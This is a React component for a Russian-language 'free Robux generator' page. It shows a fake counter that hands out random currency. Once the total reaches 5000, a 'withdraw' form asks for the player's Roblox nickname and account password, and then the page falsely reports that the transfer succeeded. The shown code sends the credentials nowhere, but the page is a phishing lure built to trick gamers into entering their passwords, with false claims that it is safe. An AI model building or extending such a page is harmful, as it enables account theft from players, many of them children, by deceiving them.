import { useState } from "react";
import { Button } from "@/components/ui/button";
import Icon from "@/components/ui/icon";

const Hero = () => {
  const [isGenerating, setIsGenerating] = useState(false);
  const [robuxCount, setRobuxCount] = useState(0);
  const [showWithdrawForm, setShowWithdrawForm] = useState(false);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isWithdrawing, setIsWithdrawing] = useState(false);
  const [animationKey, setAnimationKey] = useState(0);

  const generateRobux = () => {
    if (isGenerating) return;

    setIsGenerating(true);
    setAnimationKey((prev) => prev + 1);

    setTimeout(() => {
      const newRobux = Math.floor(Math.random() * 1000) + 100;
      const newTotal = robuxCount + newRobux;
      setRobuxCount(newTotal);
      setIsGenerating(false);

      // Показать форму при достижении 5000 робуксов
      if (newTotal >= 5000 && !showWithdrawForm) {
        setTimeout(() => setShowWithdrawForm(true), 500);
      }
    }, 2000);
  };

  const handleWithdraw = () => {
    if (!username.trim() || !password.trim()) return;

    setIsWithdrawing(true);
    // Имитация процесса вывода
    setTimeout(() => {
      alert("🎉 Робуксы успешно переведены на ваш аккаунт!");
      setIsWithdrawing(false);
      setShowWithdrawForm(false);
      setRobuxCount(0);
      setUsername("");
      setPassword("");
    }, 3000);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-roblox-blue via-roblox-purple to-roblox-orange relative overflow-hidden">
      {/* Background elements */}
      <div
        className="absolute inset-0 opacity-20"
        style={{
          backgroundImage: `url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.1'%3E%3Ccircle cx='30' cy='30' r='4'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E")`,
        }}
      ></div>

      <div className="container mx-auto px-4 py-20 relative z-10">
        <div className="text-center mb-12">
          <h1 className="text-6xl font-bold text-white mb-4 drop-shadow-lg">
            🚀 ROBUX GENERATOR
          </h1>
          <p className="text-xl text-white/90 mb-8">
            Бесплатный генератор робуксов для Roblox!
          </p>
        </div>

        {/* Main generator window */}
        <div className="max-w-2xl mx-auto glass-window rounded-3xl p-8 relative">
          {/* Rocket animation container */}
          <div className="absolute inset-0 pointer-events-none overflow-hidden rounded-3xl">
            {isGenerating && (
              <>
                <div
                  key={`rocket-${animationKey}`}
                  className="absolute left-1/2 bottom-20 transform -translate-x-1/2 text-6xl rocket-animation"
                >
                  🚀
                </div>
                <div
                  key={`robux-${animationKey}`}
                  className="absolute left-1/2 top-1/2 transform -translate-x-1/2 text-4xl robux-float"
                  style={{ animationDelay: "1s" }}
                >
                  💎
                </div>
              </>
            )}
          </div>

          <div className="text-center relative z-10">
            <div className="bg-black/20 rounded-2xl p-6 mb-8">
              <div className="text-3xl font-bold text-white mb-2">
                Ваши Robux:
              </div>
              <div className="text-5xl font-bold text-roblox-orange">
                {robuxCount.toLocaleString()} 💎
              </div>
            </div>

            <Button
              onClick={generateRobux}
              disabled={isGenerating}
              className={`w-full h-16 text-xl font-bold rounded-2xl transition-all duration-300 ${
                isGenerating
                  ? "bg-gray-500 cursor-not-allowed"
                  : "bg-roblox-green hover:bg-roblox-green/90 glow-effect"
              }`}
            >
              {isGenerating ? (
                <div className="flex items-center justify-center gap-2">
                  <Icon name="Loader2" className="animate-spin" size={24} />
                  Генерация...
                </div>
              ) : (
                <div className="flex items-center justify-center gap-2">
                  <Icon name="Zap" size={24} />
                  СГЕНЕРИРОВАТЬ ROBUX
                </div>
              )}
            </Button>
          </div>
        </div>

        {/* Форма вывода робуксов */}
        {showWithdrawForm && (
          <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50 animate-fade-in">
            <div className="glass-window rounded-3xl p-8 max-w-md w-full mx-4 animate-scale-in">
              <div className="text-center mb-6">
                <div className="text-4xl mb-4">🎉</div>
                <h2 className="text-3xl font-bold text-white mb-2">
                  Поздравляем!
                </h2>
                <p className="text-white/80">
                  Вы накопили {robuxCount.toLocaleString()} робуксов!
                </p>
                <p className="text-roblox-orange font-bold mt-2">
                  Введите данные для вывода:
                </p>
              </div>

              <div className="space-y-4">
                <div>
                  <label className="block text-white font-bold mb-2">
                    Никнейм Roblox:
                  </label>
                  <input
                    type="text"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="w-full px-4 py-3 rounded-xl bg-black/30 border border-white/20 text-white placeholder-white/50 focus:border-roblox-orange focus:outline-none transition-colors"
                    placeholder="Ваш никнейм..."
                  />
                </div>

                <div>
                  <label className="block text-white font-bold mb-2">
                    Пароль от аккаунта:
                  </label>
                  <input
                    type="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full px-4 py-3 rounded-xl bg-black/30 border border-white/20 text-white placeholder-white/50 focus:border-roblox-orange focus:outline-none transition-colors"
                    placeholder="Ваш пароль..."
                  />
                </div>

                <div className="flex gap-3 mt-6">
                  <Button
                    onClick={() => setShowWithdrawForm(false)}
                    className="flex-1 h-12 bg-gray-600 hover:bg-gray-700 rounded-xl font-bold"
                  >
                    Отмена
                  </Button>
                  <Button
                    onClick={handleWithdraw}
                    disabled={
                      !username.trim() || !password.trim() || isWithdrawing
                    }
                    className={`flex-1 h-12 rounded-xl font-bold ${
                      isWithdrawing
                        ? "bg-gray-500 cursor-not-allowed"
                        : "bg-roblox-green hover:bg-roblox-green/90 glow-effect"
                    }`}
                  >
                    {isWithdrawing ? (
                      <div className="flex items-center justify-center gap-2">
                        <Icon
                          name="Loader2"
                          className="animate-spin"
                          size={16}
                        />
                        Перевод...
                      </div>
                    ) : (
                      <div className="flex items-center justify-center gap-2">
                        <Icon name="Download" size={16} />
                        Вывести
                      </div>
                    )}
                  </Button>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Stats */}
        <div className="grid md:grid-cols-3 gap-6 mt-12 max-w-4xl mx-auto">
          <div className="glass-window rounded-2xl p-6 text-center">
            <div className="text-3xl mb-2">⚡</div>
            <div className="text-2xl font-bold text-white">Быстро</div>
            <div className="text-white/70">Мгновенная генерация</div>
          </div>
          <div className="glass-window rounded-2xl p-6 text-center">
            <div className="text-3xl mb-2">🔒</div>
            <div className="text-2xl font-bold text-white">Безопасно</div>
            <div className="text-white/70">100% защищено</div>
          </div>
          <div className="glass-window rounded-2xl p-6 text-center">
            <div className="text-3xl mb-2">🎮</div>
            <div className="text-2xl font-bold text-white">Геймерам</div>
            <div className="text-white/70">Для всех игроков</div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Hero;
